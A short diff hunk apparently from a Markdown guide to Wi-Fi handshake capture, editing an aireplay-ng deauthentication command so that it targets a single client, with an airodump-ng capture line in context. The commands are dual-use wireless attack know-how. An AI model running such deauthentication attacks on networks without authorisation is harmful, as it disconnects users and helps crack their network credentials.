@@ -47,7 +47,7 @@ sudo airodump-ng --bssid <BSSID> -c <CHANNEL> -w capture_file wlan0
 
 ### ❌ Deauthentication Attack (Force Client Reconnect)
 ```bash
-sudo aireplay-ng --deauth 10 -a <BSSID> wlan0
+sudo aireplay-ng --deauth 10 -a <BSSID> wlan0 -c <CLIENT>
 ```
 
 ### 👻 Passive Capture Without Disconnecting Clients
